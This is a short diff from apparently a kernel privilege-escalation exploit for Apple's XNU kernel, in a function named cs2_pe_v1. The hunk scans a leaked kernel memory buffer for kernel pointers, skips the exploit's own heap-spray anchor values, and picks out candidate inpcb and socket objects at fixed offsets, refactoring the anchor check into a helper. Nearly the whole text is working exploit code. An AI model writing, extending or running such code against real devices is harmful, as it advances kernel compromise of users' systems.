@@ -332,20 +332,19 @@ kern_return_t cs2_pe_v1(void) {
                         int kq = 0, ipc_cand = -1, so_cand = -1;
                         for (uint32_t wq = 0; wq + 8 <= cls_len; wq += 8) {
                             uint64_t v = *(uint64_t *)((uint8_t *)read_buffer + wq);
-                            if (cs2_ctx.heap_anchor_armed && v == cs2_ctx.heap_anchor) continue;   /* own fil-tag, not a kptr */
+                            if (cs2_own_anchor(v)) continue;   /* own fil-tag (any anchor in the set), not a kptr */
                             if ((v >> 48) >= 0xffff) kq++;
                         }
                         for (uint32_t zo = 0; zo + 0x400 <= cls_len; zo += 0x400) {
                             uint64_t z38 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x38);
                             uint64_t z40 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x40);
                             if (ipc_cand < 0 && (z38 >> 48) >= 0xffff && (z40 >> 48) >= 0xffff &&
-                                !(cs2_ctx.heap_anchor_armed &&
-                                  (z38 == cs2_ctx.heap_anchor || z40 == cs2_ctx.heap_anchor)))
+                                !cs2_own_anchor(z38) && !cs2_own_anchor(z40))
                                 ipc_cand = (int)zo;
                             uint64_t s18 = *(uint64_t *)((uint8_t *)read_buffer + zo + 0x18);
                             int32_t s23c = *(int32_t *)((uint8_t *)read_buffer + zo + 0x23c);
                             if (so_cand < 0 && (s18 >> 48) >= 0xffff && s23c > 0 && s23c < 0x10000 &&
-                                !(cs2_ctx.heap_anchor_armed && s18 == cs2_ctx.heap_anchor))
+                                !cs2_own_anchor(s18))
                                 so_cand = (int)zo;
                         }
                         LOG("[lswarm-cls] map=%lu off=0x%zx kq=%d inpcb_cand=0x%x sock_cand=0x%x (0x400 stride, static-verified)",
